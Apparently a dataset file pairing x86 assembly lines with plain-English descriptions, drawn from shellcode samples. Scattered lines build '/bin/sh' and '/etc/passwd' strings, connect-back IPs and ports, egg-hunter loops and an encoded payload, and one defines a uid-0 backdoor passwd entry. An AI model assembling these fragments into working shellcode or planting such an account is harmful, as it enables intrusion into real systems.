push 0x6e69622f \n push 0x7273752f \n mov ecx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov edx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register
push 0x6e776f64	push the 0x6e776f64 onto the stack
push 0x6e7a762d	push 0x6e7a762d onto the stack
push 0x6e7a762d \n mov ebp, esp	push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
push 0x6e7a762d \n mov ebx, esp	push the value 0x6e7a762d onto the stack and point the ebx register to the stack register
push 0x6e7a762d \n mov edi, esp	push the value 0x6e7a762d onto the stack and point the edi register to the stack register
push 0x6e7a762d \n mov esi, esp	push the value 0x6e7a762d onto the stack and point the esi register to the stack register
push 0x6f635f64	push 0x6f635f64 onto the stack
push 0x6f723a30	push 0x6f723a30 onto the stack
push 0x7 \n mov edx, esp	push the value 0x7 onto the stack and point edx to the stack register
push 0x70692f6e	push 0x70692f6e onto the stack
push 0x70692f6e	push the 0x70692f6e onto the stack
push 0x706d742f	push 0x706d742f onto the stack
push 0x706d742f	push 0x706d742f to the stack
push 0x706d742f	push the 0x706d742f onto the stack
push 0x7268732f	push 0x7268732f onto the stack
push 0x72706475	push 0x72706475 onto the stack
push 0x7273752f	push 0x7273752f onto the stack
push 0x7273752f	push 0x7273752f to the stack
push 0x7361702f	push 0x7361702f onto the stack
push 0x7361702f	push 0x7361702f to the stack
push 0x73644d24	push 0x73644d24 onto the stack
push 0x7369642d	push 0x7369642d onto the stack
push 0x7369642d	push 0x7369642d to the stack
push 0x7372656f	push 0x7372656f onto the stack
push 0x7372656f	push 0x7372656f to the stack
push 0x7372656f	push the 0x7372656f onto the stack
push 0x7374736f	push 0x7374736f onto the stack
push 0x7374736f	push the 0x7374736f onto the stack
push 0x74	push 0x74 onto the stack
push 0x74	push 0x74 to the stack
push 0x742f2f2f	push 0x742f2f2f onto the stack
push 0x742f2f2f	push the 0x742f2f2f onto the stack
push 0x742f3a31	push 0x742f3a31 onto the stack
push 0x74303072	push 0x74303072 onto the stack
push 0x7461632f \n push 0x6e69622f \n mov eax, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov ebx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov ecx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov edi, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov edx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov esi, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
push 0x74652f2f	push 0x74652f2f onto the stack
push 0x74652f2f	push the 0x74652f2f onto the stack
push 0x746f6f72	push 0x746f6f72 onto the stack
push 0x74756873	push the 0x74756873 onto the stack
push 0x74756f2f	push 0x74756f2f onto the stack
push 0x74756f2f	push the 0x74756f2f onto the stack
push 0x752f2f2f	push 0x752f2f2f onto the stack
push 0x752f2f2f	push 0x752f2f2f to the stack
push 0x7665642f	push 0x7665642f onto the stack
push 0x7665642f	push the 0x7665642f onto the stack
push 0x76766c2d	push 0x76766c2d onto the stack
push 0x76766c2d	push 0x76766c2d to the stack
push 0x76766c2d	push the 0x76766c2d onto the stack
push 0x78	push 0x78 onto the stack
push 0x78	push 0x78 to the stack
push 0x78	push the 0x78 onto the stack
push 0x782f2f32	push 0x782f2f32 onto the stack
push 0x782f2f32	push 0x782f2f32 to the stack
push 0x782f6e69	push 0x782f6e69 onto the stack
push 0x782f6e69	push 0x782f6e69 to the stack
push 0x78534a52	push 0x78534a52 onto the stack
push 0x79616c70	push 0x79616c70 onto the stack
push 0x79616c70	push 0x79616c70 to the stack
push 0x8	push 0x8 onto the stack
push 0x81e3a8c0	push 0x81e3a8c0 onto the stack
push 0x8501a8c0	push 0x8501a8c0 onto the stack
push 0xa	push 0xa onto the stack
push 0xa	push 0xa to the stack
push 0xa01a8c0	push the 0xa01a8c0 onto the stack
push 0xb	push 0xb onto the stack
push 0xb	push 0xb to the stack
push 0xdebf	push 0xdebf value to the stack
push 0xefffff7f	push 0xefffff7f onto the stack
push 0xf	push 0xf onto the stack
push 1	push 1 onto the stack
push 1	push 1 to the stack
push 10	push 10 onto the stack
push 10 \n mov eax, esp	push the value 10 onto the stack and point eax to the stack register
push 102	push 102 onto the stack
push 12 \n mov ebx, esp	push the value 12 onto the stack and point ebx to the stack register
push 15 \n mov ecx, esp	push the value 15 onto the stack and point ecx to the stack register
push 16	push 16 onto the stack
push 2	push 2 onto the stack
push 20	push 20 onto the stack
push 20	push the 20 onto the stack
push 216	push 216 value to the stack
push 6	push 6 onto the stack
push ax	push ax onto the stack
push ax	push ax to the stack
push ax	push the ax onto the stack
push bx	push bx onto the stack
push bx	push bx to the stack
push bx	push the contents of the bx register onto the stack
push byte -1	push the byte -1 onto the stack
push byte +0x1	push the byte +0x1 onto the stack
push byte +0x10	push the byte +0x10 onto the stack
push byte +0x2	push the byte +0x2 onto the stack
push byte +0x3	push the byte +0x3 onto the stack
push byte +0x46	push the byte +0x46 onto the stack
push byte +0x6	push the byte +0x6 onto the stack
push byte +0x66	push the byte +0x66 onto the stack
push byte +0x7f	push the byte +0x7f onto the stack
push byte +0x8	push the byte +0x8 onto the stack
push byte +0xb	push the byte +0xb onto the stack
push byte 0	push byte 0 onto stack
push byte 0x0	push the byte 0x0 onto the stack
push byte 0x01	push the byte 0x01 onto the stack
push byte 0x01	push the byte 0x01 to the stack
push byte 0x01 \n pop eax	put the syscall 0x01 into the eax register
push byte 0x02	push the byte 0x02 onto the stack
push byte 0x02	push the byte 0x02 to the stack
push byte 0x02 \n pop eax	put the syscall 0x02 into the eax register
push byte 0x04	push the byte 0x04 onto the stack
push byte 0x04 \n pop eax	put the syscall 0x04 into the eax register
push byte 0x05	push the byte 0x05 onto the stack
push byte 0x05 \n pop eax	put the syscall 0x05 into the eax register
push byte 0x06	push the byte 0x06 onto the stack
push byte 0x06 \n pop eax	put the syscall 0x06 into the eax register
push byte 0x0b	push the byte 0x0b onto the stack
push byte 0x0b \n pop eax	put the syscall 0x0b into the eax register
push byte 0x1	push the byte 0x1 onto the stack
push byte 0x1	push the byte 0x1 to the stack
push byte 0x1 \n mov ecx, esp	push the byte 0x1 onto the stack and point ecx to the stack register
push byte 0x10	push the byte 0x10 onto the stack
push byte 0x10 \n pop eax	put the syscall 0x10 into the eax register
push byte 0x11 \n mov ebx, esp	push the byte 0x11 onto the stack and point ebx to the stack register
push byte 0x17	push the byte 0x17 onto the stack
push byte 0x17 \n pop eax	put the syscall 0x17 into the eax register
push byte 0x1c	push the byte 0x1c onto the stack
push byte 0x1c \n pop eax	put the syscall 0x1c into the eax register
push byte 0x1f	push the byte 0x1f onto the stack
push byte 0x1f \n pop eax	put the syscall 0x1f into the eax register
push byte 0x2	push the byte 0x2 onto the stack
push byte 0x2	push the byte 0x2 to the stack
push byte 0x2 \n mov ecx, esp	push the byte 0x2 onto the stack and point ecx to the stack register
push byte 0x2 \n pop eax	put the syscall 0x2 into the eax register
push byte 0x2e	push the byte 0x2e onto the stack
push byte 0x2e \n pop eax	put the syscall 0x2e into the eax register
push byte 0x2f	push the byte 0x2f onto the stack
push byte 0x2f \n pop eax	put the syscall 0x2f into the eax register
push byte 0x3	push the byte 0x3 onto the stack
push byte 0x3 \n pop eax	put the syscall 0x3 into the eax register
push byte 0x30	push the byte 0x30 onto the stack
push byte 0x30 \n pop eax	put the syscall 0x30 into the eax register
push byte 0x3f	push the byte 0x3f onto the stack
push byte 0x3f \n pop eax	put the syscall 0x3f into the eax register
push byte 0x4	push the byte 0x4 onto the stack
push byte 0x4 \n pop eax	put the syscall 0x4 into the eax register
push byte 0x43	make the system call sigaction
push byte 0x43	sigaction
push byte 0x43	syscall for sigaction
push byte 0x43	system call sigaction
push byte 0x43 \n pop eax	put the syscall 0x43 into the eax register
push byte 0x43 \n pop eax	put syscall sigaction into the eax register
push byte 0x5 \n mov ebx, esp	push the byte 0x5 onto the stack and point ebx to the stack register
push byte 0x5 \n mov edx, esp	push the byte 0x5 onto the stack and point edx to the stack register
push byte 0x64	push the byte 0x64 onto the stack
push byte 0x64	push the byte 0x64 to the stack
push byte 0x64 \n pop eax	put the syscall 0x64 into the eax register
push byte 0x66	push the byte 0x66 onto the stack
push byte 0x66 \n pop eax	put the syscall 0x66 into the eax register
push byte 0x7 \n mov edx, esp	push the byte 0x7 onto the stack and point edx to the stack register
push byte 0x77	push the byte 0x77 onto the stack
push byte 0x77	push the byte 0x77 to the stack
push byte 0x77 \n pop eax	put the syscall 0x77 into the eax register
push byte 0x8 \n mov edx, esp	push the byte 0x8 onto the stack and point edx to the stack register
push byte 0xb	push the byte 0xb onto the stack
push byte 0xb \n pop eax	put the syscall 0xb into the eax register
push byte 0xc	push the byte 0xc onto the stack
push byte 0xc \n pop eax	put the syscall 0xc into the eax register
push byte 1	move byte 1 onto stack
push byte 1	push byte 1 onto the stack
push byte 1	push the byte 1 onto the stack
push byte 1	push the byte 1 to the stack
push byte 1 \n mov eax, esp	push the byte 1 onto the stack and point eax to the stack register
push byte 1 \n pop eax	put the syscall 1 into the eax register
push byte 10	push the byte 10 onto the stack
push byte 10	push the byte 10 to the stack
push byte 10 \n pop eax	put the syscall 10 into the eax register
push byte 11	push the byte 11 onto the stack
push byte 11	push the byte 11 to the stack
push byte 11 \n pop eax	put the syscall 11 into the eax register
push byte 15	push the byte 15 onto the stack
push byte 15	push the byte 15 to the stack
push byte 15 \n pop eax	put the syscall 15 into the eax register
push byte 16	push byte 16 onto stack
push byte 16	push the byte 16 onto the stack
push byte 16 \n pop eax	put the syscall 16 into the eax register
push byte 17h	push the byte 17h onto the stack
push byte 17h \n pop eax	put the syscall 17h into the eax register
push byte 2	push byte 2 onto the stack
push byte 2	push the byte 2 onto the stack
push byte 2 \n pop eax	put the syscall 2 into the eax register
push byte 25	push the byte 25 onto the stack
push byte 25 \n pop eax	put the syscall 25 into the eax register
push byte 28	push the byte 28 to the stack
push byte 28 \n pop eax	put the syscall 28 into the eax register
push byte 3 \n mov ebx, esp	push the byte 3 onto the stack and point ebx to the stack register
push byte 37	push the byte 37 onto the stack
push byte 37 \n pop eax	put the syscall 37 into the eax register
push byte 3h	push the byte 3h onto the stack
push byte 3h \n pop eax	put the syscall 3h into the eax register
push byte 4	push the byte 4 onto the stack
push byte 4 \n pop eax	put the syscall 4 into the eax register
push byte 49	push the byte 49 onto the stack
push byte 49 \n pop eax	put the syscall 49 into the eax register
push byte 5	push the byte 5 onto the stack
push byte 5 \n pop eax	put the syscall 5 into the eax register
push byte 54	push the byte 54 onto the stack
push byte 54 \n pop eax	put the syscall 54 into the eax register
push byte 6	push byte 6 onto the stack
push byte 6	push the byte 6 onto the stack
push byte 6	push the byte 6 to the stack
push byte 6 \n pop eax	put the syscall 6 into the eax register
push byte 67	push the byte 67 onto the stack
push byte 67 \n pop eax	put the syscall 67 into the eax register
push byte 70	push the byte 70 onto the stack
push byte 70 \n pop eax	put the syscall 70 into the eax register
push byte 8	push the byte 8 onto the stack
push byte 8 \n pop eax	put the syscall 8 into the eax register
push byte 9	push the byte 9 onto the stack
push byte 9 \n pop eax	put the syscall 9 into the eax register
push byte chmod_call	push the byte chmod_call onto the stack
push byte CHMOD_CALL \n pop eax	put the byte CHMOD_CALL into the eax register
push byte CHMOD_CALL \n pop eax	put the byte my_label into the eax register
push byte L1 \n pop eax	put the byte L1 into the eax register
push byte my_value \n pop eax	put the byte my_value into the eax register
push byte VALUE \n pop eax	put the byte VALUE into the eax register
push cx	push the contents of the cx register onto the stack
push dword [ebp+16]	push the dword [ebp+16] onto the stack
push dword [edx+2]	push the doubleword [edx+2] to the stack
push dword [edx+2]	push the dword [edx+2] onto the stack
push dword 0x00000000	push the doubleword 0x00000000 onto the stack
push dword 0x0101017f	push the dword 0x0101017f onto the stack
push dword 0x017aa8c0	push the dword 0x017aa8c0 onto the stack
push dword 0x0501a8c0	push the dword 0x0501a8c0 onto the stack
push dword 0x0a206873	push the double word 0x0a206873 onto the stack
push dword 0x10	push the dword 0x10 onto the stack
push dword 0x2	push the double word 2 onto the stack
push dword 0x214c4f4c	push the dword 0x214c4f4c onto the stack
push dword 0x2335738c	push the double word 0x2335738c onto the stack
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ebx, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ecx, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register
push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx, esp	push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register
push dword 0x2f2f6e69	push the doubleword 0x2f2f6e69 to the stack
push dword 0x2f2f6e69	push the dword 0x2f2f6e69 onto the stack
push dword 0x2f3a2f3a	push the double word 0x2f3a2f3a onto the stack
push dword 0x2f3a3a30	push the dword 0x2f3a3a30 onto the stack
push dword 0x2f6e6962	push the double word 0x2f6e6962 onto the stack
push dword 0x303a3a31	push the double word 0x303a3a31 onto the stack
push dword 0x313a303a	push the double word 0x313a303a onto the stack
push dword 0x39396e2d \n mov ebp, esp	push double word 0x39396e2d onto the stack and point the ebp register to the stack register
push dword 0x39396e2d \n mov ebx, esp	push double word 0x39396e2d onto the stack and point the ebx register to the stack register
push dword 0x39396e2d \n mov edi, esp	push double word 0x39396e2d onto the stack and point the edi register to the stack register
push dword 0x39396e2d \n mov esi, esp	push double word 0x39396e2d onto the stack and point the esi register to the stack register
push dword 0x3a303a3a	push the dword 0x3a303a3a onto the stack
push dword 0x4227a28b	push the doubleword 0x4227a28b onto the stack
push dword 0x45525649	push the dword 0x45525649 onto the stack
push dword 0x58494741	push the dword 0x58494741 onto the stack
push dword 0x5f657a69	push the dword 0x5f657a69 onto the stack
push dword 0x6164732f	push the dword 0x6164732f onto the stack
push dword 0x61702f2f	push the dword 0x61702f2f onto the stack
push dword 0x61702f63	push the dword 0x61702f63 onto the stack
push dword 0x61722f6c	push the dword 0x61722f6c onto the stack
push dword 0x61747069	push the doubleword 0x61747069 to the stack
push dword 0x61747069	push the dword 0x61747069 onto the stack
push dword 0x62732f2f	push the doubleword 0x62732f2f to the stack
push dword 0x62732f2f	push the dword 0x62732f2f onto the stack
push dword 0x62732f2f \n mov ebx, esp	push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register
push dword 0x6374652f	push the dword 0x6374652f onto the stack
push dword 0x64616568	push the dword 0x64616568 onto the stack
push dword 0x64777373	push the dword 0x64777373 onto the stack
push dword 0x656e7265	push the dword 0x656e7265 onto the stack
push dword 0x68732f2f	push the dword 0x68732f2f onto the stack
push dword 0x68732f63	push the dword 0x68732f63 onto the stack
push dword 0x68732f6e	push the dword 0x68732f6e onto the stack
push dword 0x69622f2f	push the dword 0x69622f2f onto the stack
push dword 0x69622f3a	push the dword 0x69622f3a onto the stack
push dword 0x6962732f	push the dword 0x6962732f onto the stack
push dword 0x6b2f7379	push the dword 0x6b2f7379 onto the stack
push dword 0x6b6e756a	push the dword 0x6b6e756a onto the stack
push dword 0x6d6f646e	push the dword 0x6d6f646e onto the stack
push dword 0x6e69622f	push the dword 0x6e69622f onto the stack
push dword 0x6e69922f	push the dword 0x6e69922f onto the stack
push dword 0x6f702f6e	push the dword 0x6f702f6e onto the stack
push dword 0x6f726577	push the dword 0x6f726577 onto the stack
push dword 0x7264632f	push the dword 0x7264632f onto the stack
push dword 0x72657355	push the dword 0x72657355 onto the stack
push dword 0x732f636f	push the dword 0x732f636f onto the stack
push dword 0x73656c62	push the doubleword 0x73656c62 to the stack
push dword 0x73656c62	push the dword 0x73656c62 onto the stack
push dword 0x7461632f	push the dword 0x7461632f onto the stack
push dword 0x74652f2f	push the dword 0x74652f2f onto the stack
push dword 0x74652f2f \n mov eax, esp	push double word 0x74652f2f onto the stack and point the eax register to the stack register
push dword 0x74652f2f \n mov ebp, esp	push double word 0x74652f2f onto the stack and point the ebp register to the stack register
push dword 0x74652f2f \n mov ebx, esp	push double word 0x74652f2f onto the stack and point the ebx register to the stack register
push dword 0x74652f2f \n mov ecx, esp	push double word 0x74652f2f onto the stack and point the ecx register to the stack register
push dword 0x74652f2f \n mov edx, esp	push double word 0x74652f2f onto the stack and point the edx register to the stack register
push dword 0x74652f2f \n mov esi, esp	push double word 0x74652f2f onto the stack and point the esi register to the stack register
push dword 0x7665642f	push the dword 0x7665642f onto the stack
push dword 0x776f6461	push the dword 0x776f6461 onto the stack
push dword 0x8140a8c0	push the doubleword 0x8140a8c0 to the stack
push dword eax	push the doubleword eax to the stack
push dword eax	push the dword eax onto the stack
push dword ebx	push the doubleword ebx to the stack
push dx	push dx onto the stack
push eax	preserve eax on the stack
push eax	push eax on the stack
push eax	push eax onto stack
push eax	push eax onto the stack
push eax	push eax to the stack
push eax	push eax value to the stack
push eax	push the contents of eax onto the stack
push eax	push the contents of eax register onto the stack
push eax	push the contents of the eax register onto the stack
push eax	push the value of register eax onto the stack
push eax \n mov ebx, esp	push the contents of the eax register onto the stack and point ebx to the stack register
push eax \n mov ecx, esp	push the contents of the eax register onto the stack and point ecx to the stack register
push eax \n mov edx, esp	push the contents of the eax register onto the stack and point edx to the stack register
push ebp	push ebp onto the stack
push ebp	push the contents of the ebp register onto the stack
push ebp	push the ebp onto the stack
push ebp	save old base pointer
push ebp	save the old base pointer value
push ebx	preserve ebx on the stack
push ebx	push ebx on the stack
push ebx	push ebx onto the stack
push ebx	push ebx to the stack
push ebx	push the contents of ebx onto the stack
push ebx	push the contents of ebx register onto the stack
push ebx	push the contents of the ebx register onto the stack
push ebx	push the ebx value to the stack
push ebx \n mov eax, esp	push the contents of the ebx register onto the stack and point eax to the stack register
push ebx \n mov ecx, esp	push the contents of the ebx register onto the stack and point ecx to the stack register
push ebx \n mov edx, esp	push the contents of the ebx register onto the stack and point edx to the stack register
push ecx	preserve ecx on the stack
push ecx	push ecx on the stack
push ecx	push ecx onto the stack
push ecx	push ecx to the stack
push ecx	push the contents of ecx register onto the stack
push ecx	push the contents of the ecx register onto the stack
push ecx	push the contents of the ecx register onto the stack.
push ecx	push the ecx onto the stack
push ecx	push the value of register ecx onto the stack
push edi	push edi onto the stack
push edi	push edi to the stack
push edi	push the contents of edi register onto the stack
push edi	push the contents of the edi register onto the stack
push edi	push the edi onto the stack
push edi \n mov eax, esp	push the contents of the edi register onto the stack and point eax to the stack register
push edi \n mov ebx, esp	push the contents of the edi register onto the stack and point ebx to the stack register
push edi \n mov ecx, esp	push the contents of the edi register onto the stack and point ecx to the stack register
push edi \n mov edx, esp	push the contents of the edi register onto the stack and point edx to the stack register
push edx	preserve edx on the stack
push edx	push edx on the stack
push edx	push edx onto the stack
push edx	push edx to the stack
push edx	push the contents of edx register onto the stack
push edx	push the contents of the edx register onto the stack
push edx	push the value of register edx onto the stack
push edx \n mov eax, esp	push the contents of the edx register onto the stack and point eax to the stack register
push edx \n mov ebx, esp	push the contents of the edx register onto the stack and point ebx to the stack register
push edx \n mov ecx, esp	push the contents of the edx register onto the stack and point ecx to the stack register
push esi	preserve esi on the stack
push esi	push esi on the stack
push esi	push esi onto the stack
push esi	push esi to the stack
push esi	push the contents of esi register onto the stack
push esi	push the contents of the esi register onto the stack
push esi	push the contents of the esi register onto the stack.
push esi	push the esi onto the stack
push esi \n mov eax, esp	push the contents of the esi register onto the stack and point eax to the stack register
push esi \n mov ebx, esp	push the contents of the esi register onto the stack and point ebx to the stack register
push esi \n mov ecx, esp	push the contents of the esi register onto the stack and point ecx to the stack register
push esi \n mov edx, esp	push the contents of the esi register onto the stack and point edx to the stack register
push esp	push esp onto the stack
push esp	push esp to the stack
push esp	push the contents of esp register onto the stack
push esp	push the contents of the esp register onto the stack
push esp	push the esp onto the stack
push len	push len onto the stack
push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp	put /bin/sh into the ecx register
push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp	put /bin/sh into the edx register
push name	push name onto the stack
push offset printf_msg	push address of string print_msg
push ogin	push the contents in ogin onto the stack
push sock_reg	push sock_reg onto the stack
push sock_reg	push the sock_reg onto the stack
push sys_execve	push sys_execve onto the stack
push word [edx]	push the word [edx] onto the stack
push word [edx]	push the word [edx] to the stack
push word 0544o	push the word 0544o onto the stack
push word 0644o	push the word 0644o onto the stack
push word 0666q	push the word 0666q onto the stack
push word 0x02	push the word 0x02 onto the stack
push word 0x0a	push the word 0x0a onto the stack
push word 0x0a	push the word 0x0a to the stack
push word 0x0f27	push the word 0x0f27 onto the stack
push word 0x1b6	push the word 0x1b6 onto the stack
push word 0x1b6	push the word 0x1b6 to the stack
push word 0x1ff	push the word 0x1ff onto the stack
push word 0x2	push the word 0x2 onto the stack
push word 0x2	push the word 0x2 to the stack
push word 0x2923	push 0x2923 onto stack port
push word 0x2e2e	push the word 0x2e2e onto the stack
push word 0x3436	push the word 0x3436 onto the stack
push word 0x3582	push the word 0x3582 onto the stack
push word 0x3636	push the word 0x3636 onto the stack
push word 0x3905	push the word 0x3905 onto the stack
push word 0x3905	push the word 0x3905 to the stack
push word 0x3930	push the word 0x3930 onto the stack
push word 0x401f	push the word 0x401f onto the stack
push word 0x4255	push the word 0x4255 onto the stack
push word 0x462d	push the word 0x462d onto the stack
push word 0x462d	push the word 0x462d to the stack
push word 0x5000	push 0x5000 onto stack port
push word 0x5445	push the word 0x5445 onto the stack
push word 0x5974	push the word 0x5974 onto the stack
push word 0x5c11	push the word 0x5c11 onto the stack
push word 0x5c11	push the word 0x5c11 to the stack
push word 0x632d	push the word 0x632d onto the stack
push word 0x632d	push the word 0x632d to the stack
push word 0x632d \n mov eax, esp	push the word 0x632d onto the stack and point the eax register to the stack register
push word 0x632d \n mov ebx, esp	push the word 0x632d onto the stack and point the ebx register to the stack register
push word 0x632d \n mov ecx, esp	push the word 0x632d onto the stack and point the ecx register to the stack register
push word 0x632d \n mov edi, esp	push the word 0x632d onto the stack and point the edi register to the stack register
push word 0x632d \n mov edx, esp	push the word 0x632d onto the stack and point the edx register to the stack register
push word 0x632d \n mov esi, esp	push the word 0x632d onto the stack and point the esi register to the stack register
push word 0x6465	push the word 0x6465 onto the stack
push word 0x662d	push the word 0x662d onto the stack
push word 0x662d \n mov eax, esp	push the word 0x662d onto the stack and point the eax register to the stack register
push word 0x662d \n mov ebx, esp	push the word 0x662d onto the stack and point the ebx register to the stack register
push word 0x662d \n mov ecx, esp	push the word 0x662d onto the stack and point the ecx register to the stack register
push word 0x662d \n mov edi, esp	push the word 0x662d onto the stack and point the edi register to the stack register
push word 0x662d \n mov edx, esp	push the word 0x662d onto the stack and point the edx register to the stack register
push word 0x662d \n mov esi, esp	push the word 0x662d onto the stack and point the esi register to the stack register
push word 0x6666	push the word 0x6666 onto the stack
push word 0x6873	push the word 0x6873 onto the stack
push word 0x692d	push the word 0x692d onto the stack
push word 0x697a	push the word 0x697a onto the stack
push word 0x6d6f	push the word 0x6d6f onto the stack
push word 0x6f64	push the word 0x6f64 onto the stack
push word 0x6f64	push the word 0x6f64 to the stack
push word 0x7065	push the word 0x7065 onto the stack
push word 0x722d	push the word 0x722d onto the stack
push word 0x7365	push the word 0x7365 onto the stack
push word 0x736e	push the word 0x736e onto the stack
push word 0x776f	push the word 0x776f onto the stack
push word 0x7773	push the word 0x7773 onto the stack
push word 0x7773	push the word 0x7773 to the stack
push word 0x8223	push the word 0x8223 onto the stack
push word 0xaaaa	push the word 0xaaaa onto the stack
push word 0xb315	push the word 0xb315 onto the stack
push word 0xc005	push the word 0xc005 onto the stack
push word 0xc005	push the word 0xc005 to the stack
push word 0xffff	push the word 0xffff onto the stack
push word 0xffff	push the word 0xffff to the stack
push word 1 \n mov eax, esp	push the word 1 onto the stack and point eax to the stack register
push word 10	push the word 10 to the stack
push word 100	push the word 100 onto the stack
push word 17 \n mov edx, esp	push the word 17 onto the stack and point edx to the stack register
push word 2	push 2 onto stack
push word 2	push the word 2 onto the stack
push word 2 \n mov ecx, esp	push the word 2 onto the stack and point ecx to the stack register
push word 21 \n mov ebx, esp	push the word 21 onto the stack and point ebx to the stack register
push word ax	push the word ax onto the stack
push word bx	push the word bx onto the stack
push word bx	push the word bx to the stack
push word cx	push the word cx onto the stack
push zero_reg	push the zero_reg onto the stack
push zero_reg	push zero_reg onto the stack
push_cmd:	declare push_cmd label
push_cmd:	declare the push_cmd label
pushl $0x68732f2f	push $0x68732f2f onto the stack
pushl $0x6e69622f	push $0x6e69622f onto the stack
pushw $0x632d	push $0x632d onto the stack
pushw 0x3905	push the 0x3905 onto the stack
pushw 0x682d	push the 0x682d onto the stack
pushw 0x697a	push the 0x697a onto the stack
re	define label re
read:	declare the read label
reading:	declare the reading label
real_number1 dd 1234	define the doubleword variable real_number1 and initialize to 1234
real_number2 dd 123456	define the doubleword variable real_number2 and initialize 123456
realarray resq 10	reserve an array of ten reals for realarray
realarray resq 10	reserve array realarray of 10 real numbers
ret	return
ret	return the address off the stack and returns control to that location
ret	return to caller
ret	return to our program
ret	return to the address on the top of the stack
ret	return to where the function was called
retry:	declare retry label
rol byte [esi], 0x1	left rotate the byte in esi 1 time
rol byte [esi], 0x2	left rotate the byte at the address esi by 0x2 bits
rol byte [esi], 0x2	left rotate the byte in esi 2 times
rol byte [esi], 4	rotate 4 bits left the byte starting at the address esi
rol edi, 1	left rotate the contents of the edi register by 1 bit
rol edi, 1	left rotate the edi register 1 time
rol edx, 0x4	left rotate the contents of the edx register by 0x4 bits
rol edx, 0x4	left rotate the edx register 4 times
ror byte [esi], 0x1	right rotate the byte in esi 1 time
ror esi, 1	right rotate esi 1 time
ror esi, 1	right rotate the contents of the esi register by 1 bit
rotate:	declare the rotate label
sar eax, 23	right shift the contents of eax by 23 bits
sar eax, 31	right shift the contents of eax by 31 bits
sar ebx, 31	right shift the contents of ebx by 31 bits
sar ecx, 2	right shift the value of register ecx by 2 bits
sar edx, 4	right shift the value of register edx by 4 bits
scasd	compare eax with doubleword at edi and set status flags
scasd	compare the contents of the eax register with doubleword at edi and set status flags
scasd	compare the value in eax to the doubleword addressed by edi
scasd	compare the value in the eax register to the doubleword addressed by the edi register
scasd \ jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _end	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _start	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _start \n jmp edi	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz IncAddr	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz IncAddr \n jmp edi	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n l1 IncAddr	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n l1 IncAddr \n jmp edi	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
section .bss	declare bss section
section .bss	declare code section .bss
section .bss	declare section bss
section .bss	declare section containing uninitialized data
section .bss	declare the bss section
section .bss	section bss
section .data	declare data section
section .data	declare section .data
section .data	declare section containing initialized data
section .data	declare the data section
section .data	section data
section .data	section for initialized data
section .text	declare .text section
section .text	declare code section
section .text	declare section containing code
section .text	declare section text
section .text	declare text section
section .text	declare the text section
section .text	section .text
section .text	section text
set_argv:	declare the set_argv label
set_argv:	define set_argv label
set_mark:	declare the set_mark label
set_mark:	define set_mark label
setup:	declare the setup label
shell_ret:	declare the shell_ret label
shell:	declare the shell label
shellcode:	declare the shellcode label
shellcode:	define shellcode label
shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash'	define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23	define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
shellcodelen equ $-shellcode	define shellcodelen equal to the length of shellcode
shellcodelen equ $-shellcode	define shellcodelen equal to the length shellcode
shift_decode:	declare the shift_decode label
shift_decode:	define shift_decode label
shl al, 4	left shift the contents of al by 4 bit positions
shl cx, 1	left shift cx
